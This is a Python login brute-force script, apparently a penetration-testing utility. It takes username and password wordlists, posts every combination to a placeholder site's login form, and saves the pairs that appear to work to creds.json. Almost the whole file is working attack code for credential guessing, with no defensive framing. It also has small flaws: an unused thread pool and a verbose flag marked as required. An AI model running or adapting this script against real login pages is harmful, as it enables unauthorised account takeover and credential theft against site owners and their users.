#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : bruteforce_login.py
# Author             : Podalirius (@podalirius_)
# Date created       : 24 Sep 2021

import argparse
import requests
from concurrent.futures import ThreadPoolExecutor
import json

FAILED_LOGIN_MESSAGE = b"Incorrect username or password"


def readlist(file):
    f = open(file, 'r')
    data = [line.strip() for line in f.readlines()]
    f.close()
    return list(set(data))


def trylogin(username, password):
    session = requests.Session()
    # Get cookies
    r = session.get("https://domain.ext/login")
    # Try auth
    r = session.post(
        "https://domain.ext/login?requestedURL=/fr/index.html",
        data={
            "CredentialProviderIndex": "1",
            "Username": username,
            "Password": password
        }
    )
    if FAILED_LOGIN_MESSAGE in r.content:
        return False
    else:
        return True


def worker(u, p):
    if trylogin(u, p):
        print("[+] Valid login found (%s, %s)" % (u, p))
        f = open("creds.json", "a")
        f.write(json.dumps({"username": u, "password": p}) + "\n")
        f.close()


def parseArgs():
    parser = argparse.ArgumentParser(description="Description message")
    parser.add_argument("-u", "--users", default=None, required=True, help='')
    parser.add_argument("-p", "--passwords", default=None, required=True, help='')
    parser.add_argument("-v", "--verbose", default=False, action="store_true", required=True, help='')
    return parser.parse_args()


if __name__ == '__main__':
    options = parseArgs()

    wordlist_usernames = readlist(options.users)
    wordlist_passwords = readlist(options.passwords)

    # Generate combinations
    comb = []
    for password in wordlist_passwords:
        for username in wordlist_usernames:
            comb.append((username, password))

    # Waits for all the threads to be completed
    for _c in comb:
        u, p = _c[0], _c[1]
        if trylogin(u, p):
            print("[+] Valid login found (%s, %s)" % (u, p))
            f = open("creds.json", "a")
            f.write(json.dumps({"username": u, "password": p}) + "\n")
            f.close()
        else:
            if options.verbose == True:
                print("[!] Incorrect login for (%s, %s)" % (u, p))
